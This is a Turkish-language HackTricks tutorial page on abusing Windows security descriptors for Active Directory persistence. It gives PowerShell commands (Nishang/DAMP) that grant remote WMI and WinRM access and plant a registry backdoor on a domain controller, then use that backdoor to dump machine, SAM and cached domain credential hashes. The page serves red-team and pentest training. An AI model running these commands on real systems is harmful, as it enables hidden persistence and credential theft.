# Güvenlik Tanımlayıcıları

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Güvenlik Tanımlayıcıları

[Belgelerden](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını tanımlamak için kullanılan formatı tanımlar. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Güvenlik tanımlayıcıları**, bir **nesnenin** üzerinde sahip olduğu **izinleri** **saklamak** için kullanılır. Eğer bir nesnenin **güvenlik tanımlayıcısında** sadece **küçük bir değişiklik** yapabilirseniz, o nesne üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz, bunun için ayrıcalıklı bir grubun üyesi olmanıza gerek yoktur.

Bu nedenle, bu kalıcılık tekniği, belirli nesneler üzerinde gereken her ayrıcalığı kazanma yeteneğine dayanır; böylece genellikle admin ayrıcalıkları gerektiren bir görevi admin olmadan gerçekleştirebilirsiniz.

### WMI'ye Erişim

Bir kullanıcıya **uzaktan WMI çalıştırma** erişimi verebilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM Erişimi

Bir kullanıcıya **winrm PS konsoluna erişim verin** [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hash'lara uzaktan erişim

**Kayıt defterine** erişin ve **hash'leri dökün**, böylece **DAMP** kullanarak bir **Reg arka kapısı oluşturun**, böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM**'i ve bilgisayardaki herhangi bir **önbelleklenmiş AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni bir **normal kullanıcıya bir Alan Denetleyici bilgisayarı** karşısında vermek çok faydalıdır:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Check [**Silver Tickets**](silver-ticket.md) ile bir Domain Controller'ın bilgisayar hesabının hash'ini nasıl kullanabileceğinizi öğrenin.

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
